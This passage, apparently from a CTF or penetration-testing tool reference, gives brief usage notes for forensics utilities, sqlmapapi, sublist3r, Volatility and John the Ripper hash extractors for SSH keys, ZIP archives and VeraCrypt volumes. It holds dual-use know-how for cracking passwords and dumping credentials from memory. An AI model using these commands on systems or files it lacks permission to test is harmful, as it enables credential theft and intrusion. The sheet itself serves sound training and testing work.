  blkcat: Display blocks
examples:
mmls disk.img
fls -r disk.img
icat disk.img 65 > extracted_file
fsstat disk.img

description: RESTful API server for SQLMap. Allows programmatic control of SQL injection testing.
usage:
sqlmapapi.py [options]
Options:
  -s: Start server
  -c: Client mode
  -H: Host
  -p: Port

description: Extracts password hashes from encrypted SSH private keys for cracking with John the Ripper.
usage: ssh2john <private_key> > hash.txt

description: Python tool for enumerating subdomains using search engines and other online sources.
usage:
sublist3r [options] -d <domain>
Options:
  -d: Domain
  -o: Output file
  -b: Enable bruteforce
  -t: Threads
  -e: Engines
examples:
sublist3r -d target.com
sublist3r -d target.com -o subs.txt
sublist3r -d target.com -b

description: Terminal multiplexer for managing multiple terminal sessions. More modern alternative to screen.
usage:
tmux [command]
Commands:
  new -s <name>: New session
  attach -t <name>: Attach
  ls: List sessions
Keys (Ctrl+b):
  c: New window
  d: Detach
  %: Split horizontal
examples:
tmux new -s ctf
tmux attach -t ctf
tmux ls

description: Extracts password hashes from TrueCrypt/VeraCrypt encrypted volumes for cracking.
usage: truecrypt2john <volume> > hash.txt

description: Powerful modal text editor. More features than nano but steeper learning curve.
usage:
vim [options] <file>
Modes:
  i: Insert mode
  Esc: Normal mode
  :: Command mode
Commands:
  :w: Save
  :q: Quit
  /: Search

description: Advanced memory forensics framework for analyzing RAM dumps. Extracts processes, network connections, credentials, and more.
usage:
vol3 [options] -f <memory_dump> <plugin>
Common plugins:
  windows.pslist: List processes
  windows.pstree: Process tree
  windows.netscan: Network connections
  windows.hashdump: Extract hashes
examples:
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.hashdump

description: Directory containing various wordlists for security testing. Points to /usr/share/wordlists/ on Kali.
usage:
Path: /usr/share/wordlists/
Common lists:
  rockyou.txt: Passwords
  dirb/common.txt: Web directories
  dirbuster/: Web directories
  fasttrack.txt: Quick passwords

description: Extracts password hashes from encrypted ZIP archives for cracking with John the Ripper.
usage: zip2john <archive.zip> > hash.txt
